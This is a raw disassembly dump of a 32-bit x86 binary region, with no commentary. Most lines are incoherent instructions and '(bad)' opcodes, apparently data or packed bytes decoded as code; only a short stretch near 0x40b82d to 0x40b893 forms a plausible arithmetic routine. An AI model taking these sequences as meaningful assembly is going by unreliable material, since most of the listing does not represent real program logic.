  40b2ec:	cmp    ebp,DWORD PTR [eax+0x77]
  40b2ef:	pop    esi
  40b2f0:	or     al,0xc5
  40b2f2:	or     edx,DWORD PTR ds:0xfcc3ca02
  40b2f8:	fmul   QWORD PTR [esi-0x5297e26e]
  40b2fe:	out    0xc0,al
  40b300:	je     0x40b29f
  40b302:	and    DWORD PTR [ebx+0x1a554794],eax
  40b308:	iret   
  40b309:	fimul  DWORD PTR [eax-0x66]
  40b30c:	sbb    edi,DWORD PTR [ecx]
  40b30e:	adc    eax,0x91f9dcf1
  40b313:	out    dx,eax
  40b314:	sub    DWORD PTR [eax-0x1c54fed4],ebx
  40b31a:	push   cs
  40b31b:	data16 sub al,0xec
  40b31e:	ds sbb al,0x5c
  40b321:	pop    DWORD PTR [ebx]
  40b323:	mov    ch,0x53
  40b325:	or     DWORD PTR [edi],edi
  40b327:	jg     0x40b2ed
  40b329:	dec    edx
  40b32a:	repz sub DWORD PTR [edx-0x65],ecx
  40b32e:	test   BYTE PTR [edi-0x2cf86b70],0x71
  40b335:	fucom  st(5)
  40b337:	(bad)  
  40b338:	or     DWORD PTR [ebx],edx
  40b33a:	mov    bl,0x8e
  40b33c:	or     ecx,DWORD PTR [esp+eax*2-0x624f970d]
  40b343:	jge    0x40b2d1
  40b345:	or     DWORD PTR [ebx-0x224296f6],0xe
  40b34c:	push   edx
  40b34d:	cmc    
  40b34e:	adc    al,BYTE PTR [edi-0x3c4b4034]
  40b354:	in     al,dx
  40b355:	adc    eax,0xf1d8a2ee
  40b35a:	xchg   BYTE PTR [edx-0x4ce78ea7],ch
  40b360:	cmp    DWORD PTR [eax+0x5],edx
  40b363:	inc    edx
  40b364:	repz mov al,0x2a
  40b367:	retf   0x164f
  40b36a:	(bad)  
  40b36c:	loopne 0x40b310
  40b36e:	outs   dx,BYTE PTR ds:[esi]
  40b36f:	adc    eax,DWORD PTR [eax-0x4bf3558f]
  40b375:	in     eax,0xe8
  40b377:	pop    edx
  40b378:	ja     0x40b34d
  40b37a:	add    BYTE PTR [edx-0x19],ch
  40b37d:	sbb    al,cl
  40b37f:	aas    
  40b380:	aam    0xdf
  40b382:	ins    DWORD PTR es:[edi],dx
  40b383:	dec    edi
  40b384:	dec    ebp
  40b385:	mov    eax,ds:0x6b2429f1
  40b38a:	adc    al,0x67
  40b38c:	inc    ebp
  40b38d:	xchg   ebp,eax
  40b38e:	scas   al,BYTE PTR es:[edi]
  40b38f:	dec    edx
  40b390:	xor    al,0x1d
  40b392:	dec    edi
  40b393:	lahf   
  40b394:	xchg   DWORD PTR [edi-0x4eac451d],ebp
  40b39a:	and    DWORD PTR [eax],edx
  40b39c:	enter  0x5681,0x70
  40b3a0:	and    al,0xf0
  40b3a2:	pop    eax
  40b3a3:	add    BYTE PTR [edx+0x2230d019],0xf3
  40b3aa:	mov    bh,dl
  40b3ac:	and    dh,dl
  40b3ae:	ret    
  40b3af:	sub    BYTE PTR [edx+0x2f],ch
  40b3b2:	outs   dx,BYTE PTR ds:[esi]
  40b3b3:	cmc    
  40b3b4:	push   ebp
  40b3b5:	xchg   esi,eax
  40b3b6:	push   0xffffffc5
  40b3b8:	ror    BYTE PTR [esi],0xd7
  40b3bb:	jnp    0x40b35f
  40b3bd:	std    
  40b3be:	push   esi
  40b3bf:	stc    
  40b3c0:	fidiv  DWORD PTR [ebx]
  40b3c2:	xchg   esp,eax
  40b3c3:	or     eax,DWORD PTR [ebp+0x2b3b3633]
  40b3c9:	arpl   WORD PTR [edx-0x3983a7e],bp
  40b3cf:	jmp    0x7c8d7b27
  40b3d4:	push   edi
  40b3d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3d6:	sbb    edi,DWORD PTR [ebx+0x415b2064]
  40b3dc:	mov    dl,0x69
  40b3de:	cmp    ah,bl
  40b3e0:	sub    cl,ah
  40b3e2:	mov    ds:0x2dde980,eax
  40b3e7:	pop    ecx
  40b3e8:	ret    0x3fdc
  40b3eb:	scas   eax,DWORD PTR es:[edi]
  40b3ec:	mov    bh,BYTE PTR [edx]
  40b3ee:	push   eax
  40b3ef:	mov    ch,0x5b
  40b3f1:	ja     0x40b467
  40b3f3:	stc    
  40b3f4:	mov    al,0x30
  40b3f6:	sbb    BYTE PTR [eax+0x76b894b4],dh
  40b3fc:	dec    esi
  40b3fd:	or     BYTE PTR [ebp-0x20d41f99],0x3b
  40b404:	fimul  DWORD PTR [edi]
  40b406:	xchg   DWORD PTR [edi],ebx
  40b408:	add    al,0x0
  40b40a:	add    BYTE PTR [ebx-0x58162bab],cl
  40b410:	or     BYTE PTR [eax],al
  40b412:	add    cl,ch
  40b414:	adc    al,BYTE PTR [eax+eax*1]
  40b417:	add    bl,dl
  40b419:	dec    edi
  40b41a:	int3   
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0xb3
  40b425:	js     0x40b480
  40b427:	adc    ch,al
  40b429:	xchg   BYTE PTR [esi+0x7e],bh
  40b42c:	jo     0x40b4a7
  40b42e:	jle    0x40b4ae
  40b430:	ds or  ah,0x22
  40b434:	lods   eax,DWORD PTR ds:[esi]
  40b435:	push   0x5e7c7455
  40b43a:	cld    
  40b43b:	leave  
  40b43c:	cli    
  40b43d:	add    eax,0xf146a15b
  40b442:	xchg   ebx,eax
  40b443:	dec    eax
  40b444:	and    ebp,DWORD PTR [esi+esi*1]
  40b447:	(bad)  
  40b448:	lock push esi
  40b44a:	les    esi,FWORD PTR [edi-0x6f09e8e6]
  40b450:	inc    ecx
  40b451:	or     al,0x8e
  40b453:	pop    es
  40b454:	in     eax,dx
  40b455:	add    eax,0x980645bd
  40b45a:	imul   ebx,DWORD PTR [ebx-0x54b7702],0x6af1ed5
  40b464:	adc    BYTE PTR [esi+ecx*8-0x26],ah
  40b468:	inc    ebx
  40b469:	mov    esi,0x5ba9a5cf
  40b46e:	push   0xffffffe1
  40b470:	icebp  
  40b471:	popa   
  40b472:	cmp    al,0xa5
  40b474:	push   esp
  40b475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b476:	mov    ebp,DWORD PTR [ebp+0x737b3364]
  40b47c:	sti    
  40b47d:	jg     0x40b434
  40b47f:	dec    edi
  40b480:	jle    0x40b4f5
  40b482:	clc    
  40b483:	cmp    esp,edi
  40b485:	loope  0x40b429
  40b487:	lods   eax,DWORD PTR ds:[esi]
  40b488:	dec    edi
  40b489:	mov    ebp,DWORD PTR [esi]
  40b48b:	pusha  
  40b48c:	scas   eax,DWORD PTR es:[edi]
  40b48d:	aad    0x3e
  40b48f:	mov    fs,WORD PTR [ebx+0x67]
  40b492:	mov    ebx,DWORD PTR [ebx]
  40b494:	test   eax,0x96d54a82
  40b499:	xor    al,0xd5
  40b49b:	arpl   sp,sp
  40b49d:	adc    al,0x4b
  40b49f:	mov    esi,0x368fef08
  40b4a4:	shr    esi,1
  40b4a6:	xchg   esp,eax
  40b4a7:	mov    ebx,0xc151adc2
  40b4ac:	cmc    
  40b4ad:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4af:	or     dh,BYTE PTR [edi]
  40b4b1:	hlt    
  40b4b2:	xor    BYTE PTR [ecx-0x48],dl
  40b4b5:	sbb    eax,0xd5e7b3b0
  40b4ba:	sar    ah,0xb7
  40b4bd:	pop    esi
  40b4be:	retf   
  40b4bf:	loop   0x40b531
  40b4c1:	test   eax,0xc9caf81f
  40b4c6:	mov    dl,0xa6
  40b4c8:	imul   esi,DWORD PTR [edx],0x249b1886
  40b4ce:	add    eax,0x848de4da
  40b4d3:	lods   al,BYTE PTR ds:[esi]
  40b4d4:	neg    DWORD PTR [esi+0x59]
  40b4d7:	sbb    DWORD PTR ds:0xe85f8b50,edi
  40b4dd:	shl    DWORD PTR [ebx+0x6b],0x96
  40b4e1:	push   esi
  40b4e2:	mov    ds:0x73547f9,al
  40b4e7:	xor    BYTE PTR [edi],0xdf
  40b4ea:	(bad)  
  40b4eb:	push   ecx
  40b4ec:	inc    DWORD PTR [edx+0x28fe1894]
  40b4f2:	mov    ebx,DWORD PTR [ebp+0x2ef01442]
  40b4f8:	ds jle 0x40b526
  40b4fb:	rcl    BYTE PTR [ecx-0x61e5c313],cl
  40b501:	ds push ds
  40b503:	dec    eax
  40b504:	iret   
  40b505:	dec    esi
  40b506:	xchg   edx,eax
  40b507:	mov    ebp,0xdb1c5722
  40b50c:	fs dec esp
  40b50e:	sbb    BYTE PTR [edi+0x20262a20],bh
  40b514:	add    ebx,DWORD PTR [edx*4+0x3862094]
  40b51b:	ret    
  40b51c:	mov    edx,0xf3f5062
  40b521:	imul   eax,DWORD PTR [eax+0x48fc455],0x5f
  40b528:	jno    0x40b574
  40b52a:	adc    al,0x3c
  40b52c:	int3   
  40b52d:	add    esp,DWORD PTR [edx]
  40b52f:	sub    al,0xfb
  40b531:	mov    cl,0x8a
  40b533:	sbb    DWORD PTR [edx],edx
  40b535:	cdq    
  40b536:	add    ch,0x39
  40b539:	fsubr  DWORD PTR [eax]
  40b53b:	clc    
  40b53c:	int    0x36
  40b53e:	out    0xff,eax
  40b540:	enter  0x4b95,0xc6
  40b544:	repnz addr16 xchg esp,eax
  40b547:	or     ebp,DWORD PTR [edi+0x42619a34]
  40b54d:	rcr    BYTE PTR [ebx],cl
  40b54f:	iret   
  40b550:	cwde   
  40b551:	stos   DWORD PTR es:[edi],eax
  40b552:	sub    DWORD PTR [ecx],ebx
  40b554:	push   ebx
  40b555:	push   edx
  40b556:	xor    edx,ebx
  40b558:	push   es
  40b559:	shr    DWORD PTR [ebx+edx*1+0x44],0x92
  40b55e:	les    esp,FWORD PTR [esi-0x1e]
  40b561:	(bad)  
  40b562:	ins    BYTE PTR es:[edi],dx
  40b563:	sub    BYTE PTR ss:[ebx-0x18],ch
  40b567:	outs   dx,DWORD PTR ds:[esi]
  40b568:	mov    dh,0xb
  40b56a:	mov    ch,0xe7
  40b56c:	cs into 
  40b56e:	add    ecx,edx
  40b570:	pop    ds
  40b571:	iret   
  40b572:	sti    
  40b573:	pop    eax
  40b574:	jnp    0x40b541
  40b576:	pop    esi
  40b577:	sub    ch,BYTE PTR [esi+0xa]
  40b57a:	out    0x16,al
  40b57c:	cs inc edi
  40b57e:	mov    bh,0x61
  40b580:	rol    BYTE PTR [edx],cl
  40b582:	inc    ebx
  40b583:	xor    eax,0xd357afe1
  40b588:	pop    ss
  40b589:	xor    BYTE PTR [ebp+0x4e],dh
  40b58c:	and    ebp,DWORD PTR [eax]
  40b58e:	lods   al,BYTE PTR ds:[esi]
  40b58f:	adc    ah,0xb7
  40b592:	clc    
  40b593:	sar    DWORD PTR [ecx],1
  40b595:	int3   
  40b596:	xchg   edi,eax
  40b597:	xchg   ecx,eax
  40b598:	test   BYTE PTR [ecx+0x2],0xef
  40b59c:	sub    ebx,ebp
  40b59e:	jg     0x40b5c0
  40b5a0:	retf   
  40b5a1:	xchg   BYTE PTR [esi+0x2d],bl
  40b5a4:	mov    ds:0x426099ef,eax
  40b5a9:	push   0xe54a71b4
  40b5ae:	xchg   ecx,eax
  40b5af:	dec    eax
  40b5b0:	xor    dh,bh
  40b5b2:	inc    edx
  40b5b3:	pop    ds
  40b5b4:	push   es
  40b5b5:	ret    0x85bb
  40b5b8:	xchg   edx,eax
  40b5b9:	add    bl,BYTE PTR [ecx]
  40b5bb:	fwait
  40b5bc:	jg     0x40b58f
  40b5be:	push   esp
  40b5bf:	cmp    eax,0x42ce0e81
  40b5c4:	call   0xe3c0:0x9fdd6ba7
  40b5cb:	or     esp,eax
  40b5cd:	loopne 0x40b62d
  40b5cf:	mov    WORD PTR [edi],?
  40b5d1:	jae    0x40b5db
  40b5d3:	popa   
  40b5d4:	lods   al,BYTE PTR ds:[esi]
  40b5d5:	(bad)  [esi+0x173b1647]
  40b5db:	or     al,0xc0
  40b5dd:	push   DWORD PTR [edi]
  40b5df:	in     eax,dx
  40b5e0:	data16 adc al,BYTE PTR [edx+edx*1]
  40b5e4:	and    BYTE PTR [edi],ah
  40b5e6:	les    edi,FWORD PTR [edi]
  40b5e8:	stc    
  40b5e9:	inc    edi
  40b5ea:	pop    ds
  40b5eb:	sbb    eax,0xa3def787
  40b5f0:	xchg   esp,eax
  40b5f1:	mov    eax,ds:0xf40a6580
  40b5f6:	inc    esi
  40b5f7:	mov    DWORD PTR [ebx],esi
  40b5f9:	ins    BYTE PTR es:[edi],dx
  40b5fa:	enter  0xcc4c,0x6b
  40b5fe:	fisubr DWORD PTR gs:[esi]
  40b601:	inc    ebp
  40b602:	cmp    al,0x89
  40b604:	xchg   edx,eax
  40b605:	gs test al,0x37
  40b608:	push   0xa7a0503d
  40b60d:	call   0xec14:0xb2e54d8e
  40b614:	in     al,dx
  40b615:	add    cl,BYTE PTR [edi+0x3247e90e]
  40b61b:	das    
  40b61c:	fisub  DWORD PTR [ebx-0x42f85ee4]
  40b622:	xchg   edx,eax
  40b623:	and    DWORD PTR [edi+esi*8],0x21a0f548
  40b62a:	dec    ebp
  40b62b:	aam    0x82
  40b62d:	push   ss
  40b62e:	sub    eax,0x946500f8
  40b633:	xor    DWORD PTR [ecx-0x43],edi
  40b636:	sbb    BYTE PTR [ebp*4+0x402b5fd5],bl
  40b63d:	ja     0x40b690
  40b63f:	sahf   
  40b640:	cmp    al,0x89
  40b642:	es in  al,dx
  40b644:	jp     0x40b605
  40b646:	fsubrp st(7),st
  40b648:	dec    esi
  40b649:	mov    bl,0x4b
  40b64b:	rcl    BYTE PTR [esi+0x3a5ba814],1
  40b651:	jle    0x40b652
  40b653:	mov    ecx,0x516169ee
  40b658:	test   BYTE PTR [eax-0x3a90a12a],bh
  40b65e:	bound  esp,QWORD PTR [ebx]
  40b660:	mov    esi,0x8c26e806
  40b665:	inc    eax
  40b666:	mov    eax,0x64f93cb4
  40b66b:	add    DWORD PTR [edx],ecx
  40b66d:	imul   ecx,DWORD PTR ds:0xfe2195fd,0xb8ef3219
  40b677:	stos   DWORD PTR es:[edi],eax
  40b678:	test   BYTE PTR [eax+0x74144a63],al
  40b67e:	pop    ecx
  40b67f:	cmc    
  40b680:	mov    eax,ds:0x3ac966d
  40b685:	mov    ebx,0xa00bc818
  40b68a:	push   cs
  40b68b:	jge    0x40b70a
  40b68d:	lea    eax,[ebx-0x8dbd495]
  40b693:	aam    0xd9
  40b695:	jnp    0x40b683
  40b697:	stc    
  40b698:	cmp    ebx,DWORD PTR [ebx+0x6a]
  40b69b:	ins    BYTE PTR es:[edi],dx
  40b69c:	cmp    cl,BYTE PTR [ebp-0x214c1fcf]
  40b6a2:	ds push edx
  40b6a4:	pop    es
  40b6a5:	push   eax
  40b6a6:	xchg   edi,eax
  40b6a7:	push   edi
  40b6a8:	mov    DWORD PTR [eax+0x21c836d3],0xa08d5b3e
  40b6b2:	jecxz  0x40b676
  40b6b4:	call   0x4cd2:0x854360a7
  40b6bb:	cmc    
  40b6bc:	xchg   edi,eax
  40b6bd:	mov    dh,0x45
  40b6bf:	repz ja 0x40b727
  40b6c2:	inc    edx
  40b6c3:	cmp    ebx,DWORD PTR [ebx-0x7d]
  40b6c6:	test   al,0xd9
  40b6c8:	xor    esp,DWORD PTR [eax+eiz*4]
  40b6cb:	sub    eax,0x3491ba4e
  40b6d0:	(bad)  
  40b6d1:	or     eax,0xecd1353c
  40b6d6:	lods   al,BYTE PTR ds:[esi]
  40b6d7:	loopne 0x40b6aa
  40b6d9:	mov    al,0xed
  40b6db:	sub    ebp,esi
  40b6dd:	out    0xf3,eax
  40b6df:	pop    es
  40b6e0:	push   esp
  40b6e1:	xor    eax,0x39833ab4
  40b6e6:	add    eax,0x22485f3
  40b6eb:	popa   
  40b6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ed:	test   BYTE PTR [edx-0x57],ah
  40b6f0:	mov    edx,0x7775316b
  40b6f5:	mov    dh,0xef
  40b6f7:	enter  0xbfd8,0x57
  40b6fb:	jmp    0xf257:0x23e95f50
  40b702:	cmp    DWORD PTR [ecx+0x7894becc],ebp
  40b708:	pusha  
  40b709:	mov    BYTE PTR [edi+0x51],ah
  40b70c:	outs   dx,BYTE PTR ds:[esi]
  40b70d:	xchg   DWORD PTR ds:0xde6e8a39,ecx
  40b713:	cli    
  40b714:	push   edi
  40b715:	sub    eax,DWORD PTR [edi+0xff7d9c9]
  40b71b:	lods   al,BYTE PTR ds:[esi]
  40b71c:	cli    
  40b71d:	daa    
  40b71e:	nop
  40b71f:	adc    BYTE PTR [ebx],0x3c
  40b722:	sub    al,0x33
  40b724:	test   al,0x68
  40b726:	scas   al,BYTE PTR es:[edi]
  40b727:	jle    0x40b729
  40b729:	sbb    DWORD PTR [ebx+0x7b16d526],esi
  40b72f:	fst    QWORD PTR [ecx-0x5e8bb30d]
  40b735:	addr16 or eax,0x192516ac
  40b73b:	inc    edx
  40b73c:	or     esi,ebp
  40b73e:	rcr    ebp,cl
  40b740:	xor    al,0xec
  40b742:	cmp    dl,BYTE PTR fs:[ecx-0x460994b2]
  40b749:	pop    esp
  40b74a:	pop    es
  40b74b:	dec    BYTE PTR [esi+0x1d4b6d5a]
  40b751:	mov    al,0x11
  40b753:	stos   DWORD PTR es:[edi],eax
  40b754:	test   esi,esp
  40b756:	ss xchg ebp,eax
  40b758:	ins    DWORD PTR es:[edi],dx
  40b759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b75a:	xchg   esi,eax
  40b75b:	test   al,0xec
  40b75d:	mov    bh,0xeb
  40b75f:	or     edx,edx
  40b761:	mov    ds:0x27c3a991,al
  40b766:	xor    eax,0x7a899da9
  40b76b:	xchg   edx,eax
  40b76c:	call   0x912e0995
  40b771:	daa    
  40b772:	or     eax,0xd09ddc58
  40b777:	mov    eax,0x5aba1da2
  40b77c:	xchg   esp,eax
  40b77d:	das    
  40b77e:	outs   dx,DWORD PTR ds:[esi]
  40b77f:	clc    
  40b780:	dec    edx
  40b781:	pusha  
  40b782:	jbe    0x40b77f
  40b784:	push   cs
  40b785:	cmp    al,0xde
  40b787:	pop    ebx
  40b788:	stc    
  40b789:	call   0xb140cbbb
  40b78e:	add    ch,dl
  40b790:	test   BYTE PTR [eax+edi*4],bl
  40b793:	xchg   esi,eax
  40b794:	mov    ah,0x98
  40b796:	mov    edi,ds
  40b798:	mov    al,0xed
  40b79a:	sti    
  40b79b:	mov    esp,0xfafd53b3
  40b7a0:	cmp    BYTE PTR [edi],0xf4
  40b7a3:	out    0x91,eax
  40b7a5:	jl     0x40b79d
  40b7a7:	or     al,0xf4
  40b7a9:	(bad)  
  40b7ab:	icebp  
  40b7ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ad:	(bad)  
  40b7ae:	stos   DWORD PTR es:[edi],eax
  40b7af:	jne    0x40b819
  40b7b1:	repz mov dh,0xc6
  40b7b4:	mov    ?,WORD PTR [eax+0x20]
  40b7b7:	(bad)  
  40b7b8:	push   0x78cedac6
  40b7bd:	pop    ds
  40b7be:	adc    esi,esi
  40b7c0:	mov    al,ds:0xfb241678
  40b7c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7c6:	mov    eax,0x5af8910d
  40b7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7cc:	inc    esi
  40b7cd:	xor    ebp,DWORD PTR [ecx+0x1]
  40b7d0:	jmp    0x40b83f
  40b7d2:	div    DWORD PTR ds:0x8483c70d
  40b7d8:	jge    0x40b788
  40b7da:	adc    esp,ebp
  40b7dc:	mov    eax,ds:0x88908e83
  40b7e1:	repz xor DWORD PTR [edx-0x29],esp
  40b7e5:	adc    edi,DWORD PTR [ecx]
  40b7e7:	and    edx,DWORD PTR [ecx+edi*8]
  40b7ea:	xlat   BYTE PTR ds:[ebx]
  40b7eb:	lds    ebp,FWORD PTR es:[edx]
  40b7ee:	sub    edx,DWORD PTR [ecx]
  40b7f0:	aam    0xb9
  40b7f2:	jb     0x40b781
  40b7f4:	jb     0x40b857
  40b7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7f7:	add    edx,esi
  40b7f9:	jae    0x40b83f
  40b7fb:	pop    es
  40b7fc:	sti    
  40b7fd:	xor    BYTE PTR [eax+ebp*2],ah
  40b800:	rcr    bl,1
  40b802:	repnz cmp eax,0x845c673f
  40b808:	dec    esp
  40b809:	int3   
  40b80a:	mov    ecx,0xe27c718b
  40b80f:	and    al,0x6b
  40b811:	ss ja  0x40b869
  40b814:	jp     0x40b887
  40b816:	xchg   edx,eax
  40b817:	into   
  40b818:	mov    ebp,0x21b81953
  40b81d:	shr    BYTE PTR [ecx+0x1f62b82],cl
  40b823:	mov    dl,0xca
  40b825:	ds cld 
  40b827:	fwait
  40b828:	popa   
  40b829:	sub    al,0x8b
  40b82b:	push   ebp
  40b82c:	int3   
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	mov    esi,0xe2536928
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b87a
  40b8b1:	out    0xfc,eax
  40b8b3:	iret   
  40b8b4:	js     0x40b8c3
  40b8b6:	(bad)  
  40b8b7:	stc    
  40b8b8:	cwde   
  40b8b9:	cli    
  40b8ba:	test   BYTE PTR [ebp+esi*1+0x7b],cl
  40b8be:	push   ss
  40b8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8c0:	jge    0x40b85e
  40b8c2:	scas   al,BYTE PTR es:[edi]
  40b8c3:	stc    
  40b8c4:	pop    eax
  40b8c5:	jmp    0x72cc5782
  40b8ca:	int3   
  40b8cb:	mov    ch,0x51
  40b8cd:	lock scas al,BYTE PTR es:[edi]
  40b8cf:	dec    eax
  40b8d0:	mov    BYTE PTR [ebx],bh
  40b8d2:	sahf   
  40b8d3:	xor    BYTE PTR [ebp-0x79149cbf],bh
  40b8d9:	cli    
  40b8da:	pop    eax
  40b8db:	loop   0x40b8ea
  40b8dd:	retf   0x7f17
  40b8e0:	addr16 pop ecx
  40b8e2:	adc    al,0x9a
  40b8e4:	pop    edi
  40b8e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8e6:	je     0x40b90f
  40b8e8:	lods   eax,DWORD PTR ds:[esi]
  40b8e9:	sbb    ebp,DWORD PTR [ecx+0x22]
  40b8ec:	push   edi
  40b8ed:	mov    ebp,edx
  40b8ef:	inc    ebx
  40b8f0:	fsubr  QWORD PTR [edx]
  40b8f2:	pop    ebx
  40b8f3:	rcl    bl,cl
  40b8f5:	cmp    eax,0x1fac59a1
  40b8fa:	dec    al
  40b8fc:	aam    0x6b
  40b8fe:	pop    ds
  40b8ff:	push   ebx
  40b900:	mov    esi,ecx
  40b902:	push   ebp
  40b903:	xchg   ebp,eax
  40b904:	sbb    ah,BYTE PTR [edi-0x36]
  40b907:	and    al,0x28
  40b909:	xor    ah,BYTE PTR [edi]
  40b90b:	clc    
  40b90c:	sub    edx,DWORD PTR [edi]
  40b90e:	ds es sahf 
  40b911:	add    al,0x51
  40b913:	iret   
  40b914:	fstp   TBYTE PTR [edx+0x2]
  40b917:	icebp  
  40b918:	mov    esi,0x55bcf8d9
  40b91d:	pop    es
  40b91e:	adc    ah,dh
  40b920:	jno    0x40b8e7
  40b922:	jnp    0x40b8f8
  40b924:	dec    edi
  40b925:	sti    
  40b926:	cdq    
  40b927:	mov    edx,0xbb96b452
  40b92c:	ss cmp eax,0x7bfa65b0
  40b932:	lea    ebp,[ebp-0x5b]
  40b935:	lahf   
  40b936:	(bad)  
  40b937:	or     bh,BYTE PTR [ebp+0x6c]
  40b93a:	jb     0x40b9a8
  40b93c:	jp     0x40b936
  40b93e:	xchg   edx,eax
  40b93f:	jle    0x40b8c3
  40b941:	dec    esi
  40b942:	lahf   
  40b943:	imul   edi,DWORD PTR [edi+0x30ee3361],0x2370c9f5
  40b94d:	push   ss
  40b94e:	cli    
  40b94f:	rol    DWORD PTR [ecx],0x94
  40b952:	cli    
  40b953:	or     eax,0x2b8af5f1
  40b958:	in     al,dx
  40b959:	xchg   dl,al
  40b95b:	test   BYTE PTR ds:0xad132a9f,0xb3
  40b962:	repz daa 
  40b964:	imul   ebp,DWORD PTR [ecx+0x6],0xffffffdf
  40b968:	mov    edi,0x9a2e01be
  40b96d:	push   edi
  40b96e:	mov    ebp,0xdd9b45f1
  40b973:	xchg   edx,eax
  40b974:	inc    ebp
  40b975:	cdq    
  40b976:	call   0x9f623994
  40b97b:	retf   0xf30d
  40b97e:	scas   al,BYTE PTR es:[edi]
  40b97f:	xchg   ebx,eax
  40b980:	enter  0x8bbf,0x75
  40b984:	arpl   WORD PTR [edi],ax
  40b986:	push   ss
  40b987:	(bad)  
  40b988:	adc    edx,DWORD PTR cs:[ecx+0x34a58bb2]
  40b98f:	popf   
  40b990:	cmp    ax,WORD PTR [edx]
  40b993:	dec    esi
  40b994:	push   esi
  40b995:	in     al,0x0
  40b997:	or     ch,bl
  40b999:	adc    al,0x49
  40b99b:	pop    ss
  40b99c:	or     BYTE PTR [edx+0x71],dh
  40b99f:	pop    es
  40b9a0:	pop    ebx
  40b9a1:	lea    ebx,ds:0xbb18de37
  40b9a7:	out    dx,al
  40b9a8:	xchg   ecx,eax
  40b9a9:	js     0x40b9da
  40b9ab:	or     DWORD PTR [edi-0x10beda56],0xffffffd4
  40b9b2:	mov    ecx,0x3071a9f3
  40b9b7:	or     BYTE PTR [eax+0x1a],dl
  40b9ba:	sar    DWORD PTR [ebp-0x27],cl
  40b9bd:	cld    
  40b9be:	mov    edx,0x21ce3df3
  40b9c3:	stos   DWORD PTR es:[edi],eax
  40b9c4:	mov    ebp,DWORD PTR [ebp+0x79]
  40b9c7:	sbb    edi,DWORD PTR [esi]
  40b9c9:	mov    bh,0x8a
  40b9cb:	jmp    0x40b9e3
  40b9cd:	fcomp  QWORD PTR [esi-0x1acb95c]
  40b9d3:	stos   DWORD PTR es:[edi],eax
  40b9d4:	shl    ecx,1
  40b9d6:	out    0x98,al
  40b9d8:	js     0x40b9c0
  40b9da:	loopne 0x40b9cf
  40b9dc:	mov    al,ds:0x10f37a50
  40b9e1:	stos   BYTE PTR es:[edi],al
  40b9e2:	jae    0x40ba2e
  40b9e4:	je     0x40b9ce
  40b9e6:	xor    edi,DWORD PTR [ebp+0x750889dd]
  40b9ec:	loop   0x40b9f9
  40b9ee:	cdq    
  40b9ef:	push   es
  40b9f0:	jle    0x40ba18
  40b9f2:	pop    ds
  40b9f3:	mov    eax,ds:0xed422ddf
  40b9f8:	push   cs
  40b9f9:	mov    eax,0xe009d5cc
  40b9fe:	mov    ?,WORD PTR [esi]
  40ba00:	dec    ecx
  40ba01:	je     0x40ba16
  40ba03:	outs   dx,BYTE PTR ds:[esi]
  40ba04:	imul   esp,edi,0x55b6b2b9
  40ba0a:	loop   0x40ba3f
  40ba0c:	lods   eax,DWORD PTR ds:[esi]
  40ba0d:	(bad)  
  40ba0e:	(bad)  
  40ba10:	push   edx
  40ba11:	jp     0x40b9cf
  40ba13:	les    ecx,FWORD PTR [edx]
  40ba15:	je     0x40ba2b
  40ba17:	push   esi
  40ba18:	repnz mov eax,ds:0x2f6b69d9
  40ba1e:	or     al,0xd9
  40ba20:	sub    cl,BYTE PTR ds:0xe7e42a83
  40ba26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba27:	cs into 
  40ba29:	loop   0x40b9bf
  40ba2b:	add    BYTE PTR [edi-0x72],al
  40ba2e:	fldenv [eax]
  40ba30:	xchg   edi,eax
  40ba31:	pop    ebx
  40ba32:	mov    bh,0xa7
  40ba34:	sbb    edx,DWORD PTR [ecx-0x72]
  40ba37:	in     al,dx
  40ba38:	sub    al,0xcd
  40ba3a:	or     al,BYTE PTR [eax]
  40ba3c:	es sub eax,0x420eee89
  40ba42:	test   al,0x3e
